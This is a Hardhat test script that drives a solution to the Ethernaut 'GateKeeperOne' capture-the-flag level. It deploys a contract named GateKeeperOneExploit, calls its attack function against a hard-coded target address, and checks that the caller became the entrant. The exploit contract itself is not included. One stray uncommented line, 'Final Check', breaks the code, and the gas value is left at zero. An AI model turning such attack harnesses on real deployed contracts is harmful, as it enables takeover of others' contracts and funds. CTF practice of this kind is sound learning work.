import { ethers } from "hardhat";
import { utils } from "ethers";
import { expect } from "chai";

describe("GateKeeperOne", function(){
    it("Aims to Solve the GateKeeperOne Question of the Ethernaut CTF", async function() {
        
        this.timeout(0);

        // Initial Setup (Wallet etc..) 
        const accounts = await ethers.getSigners();
        const eoa = accounts[0];
        let balance = await eoa.getBalance();

        console.log(ethers.utils.formatEther(balance));
        expect(balance).to.gt(0); // Check if the wallet amount is greater than 0 (If you have any money)

        // Define Target ABI
        const targetABI = [
            "function enter(bytes8 _gateKey) public returns (bool)",
            "function entrant() public view returns(address)"
        ]
        const targetAddr = "0xFd67C0A0D83E752c1d275BB11b70c9A44B3032A7"; // Target Contract Address Here

        // Connect to the Target Contract
        let contract = new ethers.Contract(targetAddr, targetABI, ethers.getDefaultProvider());
        let targetCont = contract.connect(eoa)
        console.log("Target Contract Deployed");

        // Define and Connect to the Malicious Contract
        const maliciousFactory = await ethers.getContractFactory("GateKeeperOneExploit");
        const maliciousContract = await maliciousFactory.deploy();


        // // Wait for Malicious Contract to be Deployed
        await eoa.provider!.waitForTransaction(maliciousContract.deployTransaction.hash);   
        console.log("Malicious Contract Deployed");
        

        //Calculate Gas via Ethernaut console
        let gasAmount = 0;

        // Exploit...
        let transaction = await maliciousContract.attack(gasAmount, {gasLimit:1000000}); //{gasLimit:1000000}

        await transaction.wait()
        console.log(transaction.gasLimit);

        Final Check
        let entrant = await targetCont.entrant();
        expect(entrant).to.eq(eoa.address);

    });
});